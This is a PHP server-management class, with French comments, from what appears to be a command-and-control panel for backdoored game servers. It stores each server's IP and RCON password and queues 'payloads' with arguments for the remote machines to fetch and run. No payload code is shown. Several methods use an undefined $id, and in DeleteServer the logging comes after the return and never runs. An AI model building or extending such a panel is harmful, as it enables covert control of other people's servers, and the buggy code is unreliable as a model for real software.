<?php
class Server
{
	// Vérifie si un serveur existe et retourne sont id
	public function GetServerByIP($ip)
	{
		if($GLOBALS['DB']->Count("server_list", ["server_ip" => $ip]) == 1)
		{
			$server_id = $GLOBALS['DB']->GetContent("server_list", ["server_ip" => $ip])[0]["id"];
			return $server_id;
		}
		else
		{
			return false;
		}
	}

	public function DoExist($id)
	{
		if($GLOBALS['DB']->Count("server_list", ["id" => $id]) == 1)
		{
			return true;
		}
		else
		{
			return false;
		}
	}


	public function CheckIFOwned($ip, $svowner)
	{
		if($GLOBALS['DB']->Count("server_list", ["server_ip" => $ip, "server_owner" => $svowner]) == 1)
		{
			return true;
		}
		else
		{
			return false;
		}
	}

	// Récupére le payload qui doit être utilisée par le serveur
	public function GetServerPayload($server_id)
	{
		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]["payload_call"];
	}

	// Récupére le server
	public function GetServer($server_id)
	{
		if ($id == null)
        {
            $id = $_SESSION['id'];
        }

        $owner = Account::GetUser($id)['fuckkey'];

		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id, "server_owner" => $owner])[0];
	}


	public function IsOwner($owner = null, $id) {
		if ($owner == null)
		{
			$owner = $_SESSION['id'];
		}

		$tocheck = Server::GetServerInfos($id)['server_owner'];

		$ownername = Account::GetUser($owner)['fuckkey'];

		if ($tocheck == $ownername) {
			return true;
		} else {
			return false;
		}

	}


	public function GetServerInfos($server_id)
	{
		if ($id == null)
        {
            $id = $_SESSION['id'];
        }

		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0];
	}

	// Ajoute un serveur
	public function AddServer($name, $ip, $users, $svowner, $rcon)
	{
		$id = Account::GetIdByKey($svowner);
		$thename = Account::GetUsername($id);

		if(empty($thename) OR empty($svowner) OR empty($id)){
			die("nop");
		}


		$GLOBALS['DB']->Insert("server_list", ["server_name" => $name, "server_ip" => $ip, "server_users" => $users, "server_rcon" => $rcon, "last_update" => time(), "payload_call" => -1, "argument" => -1, "server_owner" => $svowner]);
        Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-plus'></i>&nbsp;Un nouveau serveur et connecté : ".htmlspecialchars($name)." (".$thename.")</p>");
	}

	// Mets à jour un serveur
	public function UpdateServer($server_id, $name, $ip, $users, $svowner, $rcon)
	{
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["server_name" => $name, "server_users" => $users, "server_rcon" => $rcon, "last_update" => time(), "server_owner" => $svowner]);
	}

	// Récupére tous les serveur
	public function GetAllServer()
	{

		if ($id == null)
        {
            $id = $_SESSION['id'];
        }

        $owner = Account::GetUser($id)['fuckkey'];

		return $GLOBALS['DB']->GetContent("server_list", ["server_owner" => $owner]);


	}

	public function CountServerAPI($fuckkey)
	{

		$owner = $fuckkey;

		return $GLOBALS['DB']->Count("server_list", ["server_owner" => $owner]);


	}

	public function GetAllServerADMIN()
	{

		return $GLOBALS['DB']->GetContent("server_list");

	}

	// Supprime un serveur
	public function DeleteServer($id)
	{
		$ip = Server::GetServer($id)['server_ip'];
		return $GLOBALS['DB']->Delete("server_list", ["id" => $id]);
	    Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Le serveur ".htmlspecialchars($ip)." à été supprimé</p>");
	}

	// Appeler un Payload
	public function CallPayload($server_id, $payload_id, $arg)
	{
		$ip = Server::GetServer($server_id)['server_ip'];
		$pname = Payload::GetPayload($payload_id)['payload_name'];
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["payload_call" => $payload_id, "argument" => $arg]);
        Logs::AddLogs("<p class='text-warning'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-exclamation'></i>&nbsp;Le payload \"".$pname."\" à été appelé pour ".$ip."</p>");
	}

	// Reset un payload pour un serveur
	public function ResetPayload($server_id)
	{
		$ip = Server::GetServer($server_id)['server_ip'];
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["payload_call" => -1, "argument" => -1]);
        Logs::AddLogs("<p class='text-success'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-check'></i>&nbsp;Le serveur ".$ip." à répondu a l'apelle</p>");
	}

	// Récupéré le statut d'un apelle
	public function CallStatut($server_id)
	{
		if ($GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]['payload_call'] == -1)
		{
			return true;
		}
		else
		{
			return false;
		}
	}
}
?>
